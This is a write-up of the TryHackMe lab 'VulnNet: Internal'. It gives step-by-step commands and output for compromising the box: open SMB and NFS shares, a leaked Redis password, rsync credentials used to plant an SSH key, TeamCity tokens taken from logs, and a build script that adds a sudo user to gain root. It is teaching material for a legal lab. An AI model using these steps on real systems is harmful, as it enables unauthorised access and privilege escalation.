---
title: "VulnNet: Internal"
date: 2025-03-14
image: /assets/img/general/CTFgeneral_image.jpg
description: Writeup of the TryHackMe-CTF VulnNet Internal
categories: [TryHackMe, Easy]
tags: [linux, teamcity, nfs, redis, rsync, metasploit]
---

## Challenge Description
<center>
<table>
  <tr>
    <td>Platform</td>
    <td>TryHackMe</td>
  </tr>
  <tr>
    <td>Name</td>
    <td>VulnNet: Internal</td>
  </tr>
  <tr>
    <td>Description</td>
    <td>VulnNet Entertainment learns from its mistakes, and now they have something new for you...</td>
  </tr>
  <tr>
    <td>Difficulty</td>
    <td>Easy</td>
  </tr>
  <tr>
    <td>OS</td>
    <td>Linux</td>
  </tr>
  <tr>
    <td>Link</td>
    <td><a href="https://tryhackme.com/room/vulnnetinternal">https://tryhackme.com/room/vulnnetinternal</a></td>
  </tr>
</table>
</center>

This writeup is a possible solution of the CTF-challenge VulnNet: Internal.  

## Enumeration
I started the enumeration using `nmap`:
```bash
$ nmap -p- 10.10.85.213            
  Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-14 09:17 EDT
  Nmap scan report for 10.10.85.213
  Host is up (0.037s latency).
  Not shown: 65523 closed tcp ports (conn-refused)
  PORT      STATE    SERVICE
  22/tcp    open     ssh
  111/tcp   open     rpcbind
  139/tcp   open     netbios-ssn
  445/tcp   open     microsoft-ds
  873/tcp   open     rsync
  2049/tcp  open     nfs
  6379/tcp  open     redis
  9090/tcp  filtered zeus-admin
  36121/tcp open     unknown
  38081/tcp open     unknown
  45653/tcp open     unknown
  53475/tcp open     unknown

  Nmap done: 1 IP address (1 host up) scanned in 29.35 seconds
```
and enumerated the found services in more depth using nmap's `-A` flag:
```bash
$ nmap -A -p 22,111,139,445,873,2049,6379,36121,38081,45653,53475 10.10.85.213
  Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-14 09:19 EDT
  Nmap scan report for 10.10.85.213
  Host is up (0.043s latency).

  PORT      STATE SERVICE     VERSION
  22/tcp    open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey: 
  |   2048 5e:27:8f:48:ae:2f:f8:89:bb:89:13:e3:9a:fd:63:40 (RSA)
  |   256 f4:fe:0b:e2:5c:88:b5:63:13:85:50:dd:d5:86:ab:bd (ECDSA)
  |_  256 82:ea:48:85:f0:2a:23:7e:0e:a9:d9:14:0a:60:2f:ad (ED25519)
  111/tcp   open  rpcbind     2-4 (RPC #100000)
  | rpcinfo: 
  |   program version    port/proto  service
  |   100000  2,3,4        111/tcp   rpcbind
  |   100000  2,3,4        111/udp   rpcbind
  |   100000  3,4          111/tcp6  rpcbind
  |   100000  3,4          111/udp6  rpcbind
  |   100003  3           2049/udp   nfs
  |   100003  3           2049/udp6  nfs
  |   100003  3,4         2049/tcp   nfs
  |   100003  3,4         2049/tcp6  nfs
  |   100005  1,2,3      50093/tcp6  mountd
  |   100005  1,2,3      50647/udp   mountd
  |   100005  1,2,3      52153/udp6  mountd
  |   100005  1,2,3      53475/tcp   mountd
  |   100021  1,3,4      33294/udp   nlockmgr
  |   100021  1,3,4      44665/tcp6  nlockmgr
  |   100021  1,3,4      45653/tcp   nlockmgr
  |   100021  1,3,4      49061/udp6  nlockmgr
  |   100227  3           2049/tcp   nfs_acl
  |   100227  3           2049/tcp6  nfs_acl
  |   100227  3           2049/udp   nfs_acl
  |_  100227  3           2049/udp6  nfs_acl
  139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
  445/tcp   open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
  873/tcp   open  rsync       (protocol version 31)
  2049/tcp  open  nfs         3-4 (RPC #100003)
  6379/tcp  open  redis       Redis key-value store
  36121/tcp open  mountd      1-3 (RPC #100005)
  38081/tcp open  mountd      1-3 (RPC #100005)
  45653/tcp open  nlockmgr    1-4 (RPC #100021)
  53475/tcp open  mountd      1-3 (RPC #100005)
  Service Info: Host: VULNNET-INTERNAL; OS: Linux; CPE: cpe:/o:linux:linux_kernel

  Host script results:
  | smb-security-mode: 
  |   account_used: guest
  |   authentication_level: user
  |   challenge_response: supported
  |_  message_signing: disabled (dangerous, but default)
  |_nbstat: NetBIOS name: VULNNET-INTERNA, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
  | smb2-time: 
  |   date: 2025-03-13T13:19:27
  |_  start_date: N/A
  |_clock-skew: mean: -20m12s, deviation: 34m37s, median: -13s
  | smb-os-discovery: 
  |   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
  |   Computer name: vulnnet-internal
  |   NetBIOS computer name: VULNNET-INTERNAL\x00
  |   Domain name: \x00
  |   FQDN: vulnnet-internal
  |_  System time: 2025-03-13T14:19:27+01:00
  | smb2-security-mode: 
  |   3:1:1: 
  |_    Message signing enabled but not required

  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  Nmap done: 1 IP address (1 host up) scanned in 19.00 seconds
```
From here I proceeded the analysis port by port.

## Port 445 Analysis

I began analyzing the SMB share using `enum4linux`, which identified a share:
```bash
$ enum4linux 10.10.85.213
[...]
shares          Disk      VulnNet Business Shares
[...]
//10.10.85.213/shares   Mapping: OK Listing: OK Writing: N/A
[...]
```

To access the share, I used `smbclient`, which allowed me to download three files:
```bash
$ smbclient  -N \\\\10.10.85.213\\shares                            
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Tue Feb  2 04:20:09 2021
  ..                                  D        0  Tue Feb  2 04:28:11 2021
  temp                                D        0  Sat Feb  6 06:45:10 2021
  data                                D        0  Tue Feb  2 04:27:33 2021
  
smb: \temp\> ls
  .                                   D        0  Sat Feb  6 06:45:10 2021
  ..                                  D        0  Tue Feb  2 04:20:09 2021
  services.txt                        N       38  Sat Feb  6 06:45:09 2021
smb: \data\> ls
  .                                   D        0  Tue Feb  2 04:27:33 2021
  ..                                  D        0  Tue Feb  2 04:20:09 2021
  data.txt                            N       48  Tue Feb  2 04:21:18 2021
  business-req.txt                    N      190  Tue Feb  2 04:27:33 2021
```

While analyzing the files, I discoverd the first flag:
```bash
$ cat services.txt  
  THM{0[removed]a}
$ cat data.txt 
  Purge regularly data that is not needed anymore
$ cat business-req.txt 
  We just wanted to remind you that we’re waiting for the DOCUMENT you agreed to send us so we can complete the TRANSACTION we discussed.
  If you have any questions, please text or phone us.
```

## Port 111 Analysis

I attempted to enumerate network file shares by using `showmount`. I was able to access a share and found a Redis configuration file containing a password: 
```bash
$ showmount -e 10.10.85.213             
Export list for 10.10.85.213:
/opt/conf *

$ mkdir /tmp/mount
$ sudo mount -t nfs 10.10.85.213:/opt/conf /tmp/mount/ -nolock
$ ls
hp  init  opt  profile.d  redis  vim  wildmidi

$ cat redis.conf | grep -v '#'
  [...]
  requirepass "B[removed]F"
  [...]
```

## Port 6379 Analysis

Since I had discoverd a Redis configuration file, I proceeded with port 6379, which likely hosted a Redis server. I authenticated using the previously found password: 
```bash
$ redis-cli -h 10.10.85.213                                   
10.10.85.213:6379> AUTH B65Hx562F@ggAZ@F
OK
```

Once authenticated, I listed all available keys, two of which caught my attention. While I retrieved the next flag, the `authlist` key contained an interesting base64-encoded string: 
```bash
10.10.85.213:6379> keys *
1) "authlist"
2) "tmp"
3) "marketlist"
4) "internal flag"
5) "int"
10.10.85.213:6379> get "internal flag"
"THM{f[removed]1}"
10.10.85.213:6379> lrange "authlist" 0 10
1) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhbcmVtb3ZlZF12"
2) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhbcmVtb3ZlZF12"
3) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhbcmVtb3ZlZF12"
4) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhbcmVtb3ZlZF12"
10.10.85.213:6379>
```

After decoding the Base64 string, I obtained credentials to interact with the system via rsync:
```bash
$ echo "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhbcmVtb3ZlZF12" | base64 -d
Authorization for rsync://rsync-connect@127.0.0.1 with password H[removed]v
```

## Port 873 Analysis

For further enumeration, I started Metasploit and loaded a module that lists available rsync modules:
```bash
msf6 > use auxiliary/scanner/rsync/modules_list
msf6 auxiliary(scanner/rsync/modules_list) > set RHOSTS 10.10.85.213
  RHOSTS => 10.10.85.213
msf6 auxiliary(scanner/rsync/modules_list) > run

  [+] 10.10.85.213:873      - 1 rsync modules found: files
  [*] 10.10.85.213:873      - Scanned 1 of 1 hosts (100% complete)
  [*] Auxiliary module execution completed
```

The Metasploit module revealed that the `files` module was available, so I accessed it and successfully retrieved the user flag:
```bash
$ rsync -av -P rsync://rsync-connect@10.10.85.213/files rsyncoutput
/rsyncoutput/sys-internal$ ls
  Desktop  Documents  Downloads  Music  Pictures  Public  Templates  user.txt  Videos
/rsyncoutput/sys-internal$ cat user.txt 
  THM{d[removed]b}
```

## Initial Access 

Since I was able to upload files using rsync, I created a new SSH key pair:
```bash
$ ssh-keygen -t rsa
  Generating public/private rsa key pair.
  Enter file in which to save the key (/home/kali/.ssh/id_rsa): /home/kali/ctf/vulnnetinternal/id_rsa
  Enter passphrase (empty for no passphrase): 
  Enter same passphrase again: 
  Your identification has been saved in /home/kali/ctf/vulnnetinternal/id_rsa
  Your public key has been saved in /home/kali/ctf/vulnnetinternal/id_rsa.pub
  The key fingerprint is:
  SHA256:zWU4ejN1NN1NkGMD7jN1pPEW7NkzWnpPEzWU4zWnVZ7N4zWnD kali@kali
  The key's randomart image is:
  +---[RSA 3072]----+
  |      . E        |
  |     ..+ . .     |
  |. + . o=. + .    |
  | B = *ooo. o     |
  |* + * +oS        |
  | o = ++.*.       |
  |  .o+o.* +       |
  |  ++= .   .      |
  | o.o+o           |
  +----[SHA256]-----+
```

Once the key was created, I uploaded the public key to the `authorized_keys` file on the system, allowing me to connect via SSH and gained initial access:
```bash
$ rsync -av id_rsa.pub rsync://rsync-connect@10.10.85.213/files/sys-internal/.ssh/authorized_keys
  Password: 
  sending incremental file list
  id_rsa.pub

  sent 670 bytes  received 35 bytes  470.00 bytes/sec
  total size is 563  speedup is 0.80
$ ssh -i id_rsa sys-internal@10.10.85.213
```

## Privilege Escalation

While enumerating the system to escalate my privileges, I discoverd an interesting service: a TeamCity instance listening on port 8111. Since I had SSH access to the machine, I tunneled port 8111 and accessed the website.
```bash
$ ps auxw | grep "root"
  root       563  0.0  0.0   4628   680 ?        S    14:14   0:00 sh teamcity-server.sh _start_internal
$ ss -tlpn
[...]
  LISTEN             0                   100                                [::ffff:127.0.0.1]:8111                                         *:*
[...]
$ ssh -i id_rsa sys-internal@10.10.85.213 -L 8111:127.0.0.1:8111
```

![TeamCity Login](/assets/img/tryhackme/Vulnnetinternal/thm_vulnnetinternal_1.jpg)

Since I had no hints about any credentials, I attempted the superuser action, but was prompted for an authentication token. I asked Copilot where I might find it and received a useful hint:

![Superuser](/assets/img/tryhackme/Vulnnetinternal/thm_vulnnetinternal_2.jpg)

![Copilot](/assets/img/tryhackme/Vulnnetinternal/thm_vulnnetinternal_3.jpg)

I discoverd several tokens in the log files and successfully logged in with one of them:
```bash
/TeamCity/logs$ cat * | grep "token"
cat: catalina.2021-02-06.log: Permission denied
cat: catalina.2021-02-07.log: Permission denied
cat: catalina.2025-03-13.log: Permission denied
[TeamCity] Super user authentication token: 8[removed]5 (use empty username with the token as the password to access the server)
[TeamCity] Super user authentication token: 8[removed]5 (use empty username with the token as the password to access the server)
cat: [TeamCity] Super user authentication token: 3[removed]6 (use empty username with the token as the password to access the server)
[TeamCity] Super user authentication token: 5[removed]2 (use empty username with the token as the password to access the server)
[TeamCity] Super user authentication token: 1[removed]5 (use empty username with the token as the password to access the server)
[TeamCity] Super user authentication token: 1[removed]5 (use empty username with the token as the password to access the server)
```

To escalate my privileges, I needed to execute a build script, which allowed me to run arbitrary code:

![TeamCity build script 1](/assets/img/tryhackme/Vulnnetinternal/thm_vulnnetinternal_4.jpg)

![TeamCity build script 2](/assets/img/tryhackme/Vulnnetinternal/thm_vulnnetinternal_5.jpg)

After this step, I clicked on `skip`.

![TeamCity build script 3](/assets/img/tryhackme/Vulnnetinternal/thm_vulnnetinternal_6.jpg)

![TeamCity build script 4](/assets/img/tryhackme/Vulnnetinternal/thm_vulnnetinternal_7.jpg)

![TeamCity build script 5](/assets/img/tryhackme/Vulnnetinternal/thm_vulnnetinternal_8.jpg)

I used the following commands to create a new user and add the user to the sudoers file.
```bash
username="superuser"
password="superuser123"
sudo useradd -m -s /bin/bash $username
echo "$username:$password" | sudo chpasswd
sudo adduser $username sudo
```

![TeamCity build script 6](/assets/img/tryhackme/Vulnnetinternal/thm_vulnnetinternal_9.jpg)

![TeamCity build script 7](/assets/img/tryhackme/Vulnnetinternal/thm_vulnnetinternal_10.jpg)

After my script was executed successfully, I checked if the user had been added to the `passwd` file. Great! Since my new user had the same permissions as root, I was able to change to my user and then to root. Afterwards, I was able to retrieve the root flag:
```bash
/TeamCity/logs$ cat /etc/passwd
  [...]
  superuser:x:1001:1001::/home/superuser:/bin/bash
sys-internal@vulnnet-internal:/TeamCity/logs$ su superuser
  Password:
superuser@vulnnet-internal:/TeamCity/logs$ sudo su
root@vulnnet-internal:/TeamCity/logs# cd /root
root@vulnnet-internal:~# cat root.txt
  THM{e[removed]d}
```

solved! :)